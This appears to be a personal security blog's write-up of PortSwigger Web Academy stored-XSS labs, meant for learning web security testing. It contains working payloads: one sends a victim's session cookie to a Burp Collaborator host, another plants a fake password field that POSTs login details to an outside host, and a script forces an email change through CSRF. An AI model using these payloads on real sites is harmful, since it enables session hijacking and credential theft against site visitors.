<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the stored XSS Vulnerabilities." /><meta property="og:description" content="Intro This post/writeup is all about the stored XSS Vulnerabilities." /><link rel="canonical" href="https://an9k0r.github.io/posts/stored_XSS/" /><meta property="og:url" content="https://an9k0r.github.io/posts/stored_XSS/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-25T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the stored XSS Vulnerabilities.","headline":"(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)","dateModified":"2023-12-03T07:34:49+01:00","url":"https://an9k0r.github.io/posts/stored_XSS/","datePublished":"2023-01-25T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/stored_XSS/"},"@context":"https://schema.org"}</script><title>(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS) | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2023-01-25 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 25, 2023, 8:00 AM +0100" >Jan 25</em> </span> <span> Updated <em class="timeago" date="2023-12-03 07:34:49 +0100 " data-toggle="tooltip" data-placement="bottom" title="Sun, Dec 3, 2023, 7:34 AM +0100" >Dec 3</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="780 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the stored XSS Vulnerabilities.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><p>To learn more on the topic, please visit the article linked above at Portswigger’s.</p><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#lab-stored-xss-into-html-context-with-nothing-encoded">Lab: Stored XSS into HTML context with nothing encoded</a><li><a href="#exploiting-cross-site-scripting-to-steal-cookies">Exploiting cross-site scripting to steal cookies</a><li><a href="#exploiting-cross-site-scripting-to-capture-passwords">Exploiting cross-site scripting to capture passwords</a><li><a href="#exploiting-cross-site-scripting-to-perform-csrf">Exploiting cross-site scripting to perform CSRF</a><li><a href="#stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped">Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</a><li><a href="#stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Stored XSS into anchor href attribute with double quotes HTML-encoded</a></ul><h1 id="lab-stored-xss-into-html-context-with-nothing-encoded">Lab: Stored XSS into HTML context with nothing encoded</h1><blockquote><p>This lab contains a stored cross-site scripting vulnerability in the comment functionality.</p><p>To solve this lab, submit a comment that calls the alert function when the blog post is viewed.</p></blockquote><p>This is the webpage that we get on after we spin the lab.</p><p><img data-src="/assets/images/c89ad083d0dfbc6bf908dee03f3b85576fec9ebd6173fb6b404523c35c5d80e7.png" alt="picture 1" data-proofer-ignore></p><p>We can send a post.</p><p><img data-src="/assets/images/b031e33dd7fe51dd43480a4dd071803536d0795eb5608944dd97f82f19c204aa.png" alt="picture 2" data-proofer-ignore></p><p>Alert triggers on <code class="language-plaintext highlighter-rouge">Comment</code> entry:</p><p><img data-src="/assets/images/03597b44f2184b36720316eb36fc70a886f1dacd05813a8c4e9d50a793a13804.png" alt="picture 3" data-proofer-ignore></p><p>Source Code</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"comment"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;p&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/resources/images/avatarDefault.svg"</span> <span class="na">class=</span><span class="s">"avatar"</span><span class="nt">&gt;</span>                            
    <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"author"</span> <span class="na">href=</span><span class="s">"http://&amp;lt;script&amp;gt;alert(3)&amp;lt;/script&amp;gt;.com"</span><span class="nt">&gt;</span>test<span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>alert(2)<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span><span class="nt">&lt;/a&gt;</span> | 27 January 2023
  <span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
  <span class="nt">&lt;p&gt;&lt;/p&gt;</span>
<span class="nt">&lt;/section&gt;</span>
</pre></table></code></div></div><h1 id="exploiting-cross-site-scripting-to-steal-cookies">Exploiting cross-site scripting to steal cookies</h1><p><strong>Collaborator has to be used in order to solve the lab</strong></p><blockquote><p>This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim’s session cookie, then use this cookie to impersonate the victim.</p></blockquote><p>Webpage looks like in the previous lab.</p><p>We can trigger XSS in the <code class="language-plaintext highlighter-rouge">Comment</code> section.</p><p><img data-src="/assets/images/207ea1c0215ff613634222a0788608ef5d3b3036d263a45d838dff43c35dd32d.png" alt="picture 4" data-proofer-ignore></p><p>Cookie will be printed in the alert popup.</p><p><img data-src="/assets/images/dfa0f7dced73cca96f7ccd9020d0535652a8daa0ca86b3394b8a8940aebbe788.png" alt="picture 5" data-proofer-ignore></p><p>As we now need to exfiltrate the token, we’ll need to use payload that will send that token to Burps Collaborator.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;script&gt;location='http://iyk9morvj5u0hqdrwttw8300frli98xx.oastify.com/c='+document.cookie;&lt;/script&gt;
</pre></table></code></div></div><p>We should soon see an entry in our Collaborator.</p><p><img data-src="/assets/images/ccf5b54528ffc0de04cfd6fe3b61394e68582f7596e839821a832c568a002ad3.png" alt="picture 7" data-proofer-ignore></p><p>We can now simply change <code class="language-plaintext highlighter-rouge">session</code> token with the one found in Collaborator.</p><p><img data-src="/assets/images/d87e266a5bc8a745214dadedbafddec619288d01d508bc10afe3f07f026ca1ad.png" alt="picture 6" data-proofer-ignore></p><h1 id="exploiting-cross-site-scripting-to-capture-passwords">Exploiting cross-site scripting to capture passwords</h1><p><strong>Collaborator has to be used in order to solve the lab</strong></p><blockquote><p>This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim’s username and password then use these credentials to log in to the victim’s account.</p></blockquote><p>Lab looks exactly the same as the previous ones. We can send posts where XSS vulnerability resides.</p><p>First we have to find a XSS:</p><p><img data-src="/assets/images/380f214820fd243663c105a8103b8d96c407ff27dce6f11e8b3923d8e6ebb82f.png" alt="picture 1" data-proofer-ignore></p><p>This fires an alert.</p><p>To read the stored passwords, following payload will be used.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">username</span> <span class="na">id=</span><span class="s">username</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">password</span> <span class="na">name=</span><span class="s">password</span> <span class="na">onchange=</span><span class="s">"if(this.value.length) fetch('https://b5hjav637onob24mud688qqf46axyqmf.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"</span><span class="nt">&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/images/1abcc075df1dc799630ce9a219c1cb6b366fccf029333c02d5f0adec91a0f95a.png" alt="picture 8" data-proofer-ignore></p><p>Let’s add a comment. We should get a callback from a victim:</p><p><img data-src="/assets/images/7a657e5733a65cfd26fd1b85d09f385255cee4785e20fb8beff919bb3149bd45.png" alt="picture 2" data-proofer-ignore></p><p>Log in and finish the lab.</p><h1 id="exploiting-cross-site-scripting-to-perform-csrf">Exploiting cross-site scripting to perform CSRF</h1><blockquote><p>This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>Same as in the previous lab, there is a Stored XSS in the comment field.</p><p><img data-src="/assets/images/98d18a2e7d0867853efde02b03327465adbd5bf74a1f722c847aba59aad2cd82.png" alt="picture 3" data-proofer-ignore></p><p>This is the payload which will fetch the CSRF token and change the email from victim.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="dl">"</span><span class="s2">/change-email</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
  <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">body</span><span class="p">:</span> <span class="nx">formData</span>
  <span class="p">})</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fetchUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">email</span><span class="p">){</span>
	<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">text</span> <span class="o">=&gt;</span> <span class="p">{</span>
		  <span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="dl">'</span><span class="s1">email=</span><span class="dl">'</span><span class="o">+</span><span class="nx">email</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;csrf=</span><span class="dl">'</span><span class="o">+</span><span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/csrf" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">+</span><span class="se">)</span><span class="sr">"/</span><span class="p">)[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="p">}))</span>
<span class="p">}</span>

<span class="nx">fetchUrl</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://0a87006804525819c1b3cb09006500cf.web-security-academy.net/my-account</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">test@test.de</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/images/51b82672a4c0bd2ff9625a5246b66ecbdf939f637643e15daac368227d2c56cb.png" alt="picture 4" data-proofer-ignore></p><h1 id="stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped">Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h1><blockquote><p>This lab contains a stored cross-site scripting vulnerability in the comment functionality.</p><p>To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.</p></blockquote><p>If we add a comment and if we check the source code afterwards, we’ll notice that our email addrss get’s embedded into HTML like this</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/resources/images/avatarDefault.svg"</span> <span class="na">class=</span><span class="s">"avatar"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"author"</span> <span class="na">href=</span><span class="s">"http://test.de"</span> <span class="na">onclick=</span><span class="s">"var tracker={track(){}};tracker.track('http://test.de');"</span><span class="nt">&gt;</span>test<span class="nt">&lt;/a&gt;</span> 
  | 24 March 2023
<span class="nt">&lt;/p&gt;</span>
</pre></table></code></div></div><p>If we add single or double quotes, they will get escaped</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"author"</span> <span class="na">href=</span><span class="s">"http://\'&amp;quot;alert(3).com"</span> <span class="na">onclick=</span><span class="s">"var tracker={track(){}};tracker.track('http://\'&amp;quot;alert(3).com');"</span><span class="nt">&gt;</span>a<span class="nt">&lt;/a&gt;</span>
</pre></table></code></div></div><p>Payload used in Webpage field: <code class="language-plaintext highlighter-rouge">http://a?&amp;apos;-alert(1)-&amp;apos;</code></p><p>And this is how it got escaped:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"author"</span> <span class="na">href=</span><span class="s">"http://a?'-alert(1)-'"</span> <span class="na">onclick=</span><span class="s">"var tracker={track(){}};tracker.track('http://a?'-alert(1)-'');"</span><span class="nt">&gt;</span>s<span class="nt">&lt;/a&gt;</span>
</pre></table></code></div></div><p>Alert has fired and lab has been solved.</p><p><img data-src="/assets/images/57e85b8312bdcbd2c97324e3cb3c2df3e43d693ca98677ed0e2cd28948ef2e1b.png" alt="picture 5" data-proofer-ignore></p><h1 id="stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Stored XSS into anchor href attribute with double quotes HTML-encoded</h1><blockquote><p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.</p></blockquote><p>Injection in the <code class="language-plaintext highlighter-rouge">href</code> attribute ==&gt; <code class="language-plaintext highlighter-rouge">javascript:alert(1)</code>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/cross-site-scripting/'>Cross Site Scripting</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/cross-site-scripting/" class="post-tag no-text-decoration" >Cross Site Scripting</a> <a href="/tags/stored-xss/" class="post-tag no-text-decoration" >Stored XSS</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/stored_XSS/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS) - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/stored_XSS/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/stored_XSS/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/DOM-XSS/"><div class="card-body"> <em class="timeago small" date="2023-03-25 08:00:00 +0100" >Mar 25</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the DOM-Based XSS Vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To lea...</p></div></div></a></div><div class="card"> <a href="/posts/Reflected_XSS/"><div class="card-body"> <em class="timeago small" date="2022-10-04 09:00:00 +0200" >Oct 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Reflected Cross-Site Scripting (XSS)</h3><div class="text-muted small"><p> Intro This post is dedicated to XSS related Labs at Portswigger Web Academy TOC Intro TOC Finding a XSS Reflected XSS into HTML context with nothing encoded Reflected ...</p></div></div></a></div><div class="card"> <a href="/posts/websockets/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Websockets</h3><div class="text-muted small"><p> Intro This post/writeup is all about the insecure deserialization vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as we...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/DOM_based_vulns/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - DOM-based Vulnerabilities</p></a> <a href="/posts/forgot/" class="btn btn-outline-primary" prompt="Newer"><p>(HTB) - Forgot</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a 